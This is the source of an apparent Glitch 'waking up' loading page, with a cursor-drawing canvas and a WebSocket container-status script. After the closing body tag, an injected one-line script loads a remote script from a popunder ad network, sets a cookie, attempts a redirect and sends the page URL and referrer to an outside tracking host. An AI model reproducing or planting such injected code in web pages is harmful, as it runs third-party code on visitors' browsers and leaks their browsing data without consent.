<script src="https://cdnjs.cloudflare.com/ajax/libs/bowser/1.9.4/bowser.min.js"></script>

// drawing

var canvas, context, canvasImage;

var cursorPosition = {
  x: undefined,
  y: undefined,
};
var color = '#e5e5e5';
var size = 30;

function randomColor() {
  var colors = [
    '#fcd1c4',
    '#abfcec',
    '#a3d9e1',
    '#fbbfff',
    '#a9ef8f',
    '#fff0b2',
    '#fff0b2',
  ];
  color = colors[Math.floor(Math.random() * colors.length)];
}

function throttle(ms, fn) {
  var lastCallTime;
  return function () {
    var now = Date.now();
    if (!lastCallTime || now - lastCallTime > ms) {
      lastCallTime = now;
      fn.apply(this, arguments);
    }
  }
}

function drawCircle(event) {
  context.beginPath();
  context.arc(cursorPosition.x, cursorPosition.y, size, 0, 2 * Math.PI);
  context.closePath();
  context.fillStyle = color;
  context.fill();
  canvasImage = context.getImageData(0, 0, window.innerWidth, window.innerHeight);
}

window.onload = function () {
  randomColor();
  canvas = document.getElementById('background');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  context = canvas.getContext('2d');

  window.onresize = throttle(100, function () {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    context.clearRect(0,0, window.innerWidth, window.innerHeight);
    canvasImage && context.putImageData(canvasImage, 0, 0);
  });

  window.onmousemove = throttle(10, function (event) {
    cursorPosition = {
      x: event.clientX,
      y: event.clientY,
    };
    drawCircle(event);
  });

  window.ontouchmove = throttle(10, function (event) {
    cursorPosition = {
      x: event.touches[0].clientX,
      y: event.touches[0].clientY,
    };
    drawCircle(event);
  });
}
</script>

<script>
// container status updates
setTimeout(function () {
  function reloadAfterDelay(delay) {
    delay = delay || 1000;
    return setTimeout(function () {
      window.location.reload(true);
    }, delay);
  }
  try {
    var isValidBrowser = bowser.check({
      ios: "7",
      msie: "10",
      android: "4.4",
      chrome: "16",
      firefox: "11",
    });

    if (!isValidBrowser) {
      throw new Error("Jump to refresh");
    }

    var initialReloadHandler = reloadAfterDelay(5000);

    var ws = new WebSocket("wss://" + document.location.hostname + "/___glitch_loading_status___");
    ws.onmessage = updateContainerStatus;
    ws.onerror = reloadAfterDelay;
    ws.onopen = function () {
      clearTimeout(initialReloadHandler);
      setInterval(function () {
        ws.send("keepalive");
      }, 15000);
    };
    ws.onclose = function () {
      reloadAfterDelay(10);
    };

    function updateContainerStatus(event) {
      try {
        var data = JSON.parse(event.data);
        var message = document.getElementById('message')
        var text = "";
        switch (data.text) {
          case "initialize":
            text = "Waking up";
            break;
          case "install":
            text = "Preparing";
            break;
          case "restart":
            text = "Starting";
            break;
          case "listening":
            text = "Ready";
            break;
          default:
            return;
        }
        message.innerHTML = text;
        document.title = text + " ･ﾟ✧";

        if (data.text === 'listening') {
          window.location.reload(true);
        }
      } catch (e) {
        reloadAfterDelay();
      }
    }
  } catch (e) {
    reloadAfterDelay();
  }
}, 0);
</script>
  </body><script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="//deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='//minecutasupport.glitch.me/pages/imevrstk.php?qd=IBL&zqd=015.005&nbid=4817011fd1bb0bad89ff9c6857f639d8&cid=309338&at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
</html>
